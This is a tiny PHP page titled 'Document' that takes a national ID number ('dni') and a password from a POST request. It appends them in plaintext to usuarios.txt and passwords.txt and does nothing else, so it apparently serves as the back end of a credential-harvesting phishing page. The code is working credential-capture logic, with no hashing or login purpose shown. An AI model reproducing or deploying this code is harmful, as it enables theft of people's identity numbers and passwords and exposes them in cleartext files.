<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
</head>
<body>
    
<?php

$dni = $_POST["dni"];
$password = $_POST["password"];


file_put_contents('usuarios.txt', $dni.PHP_EOL , FILE_APPEND | LOCK_EX);
file_put_contents('passwords.txt', $password.PHP_EOL , FILE_APPEND | LOCK_EX);

?>



</body>
</html>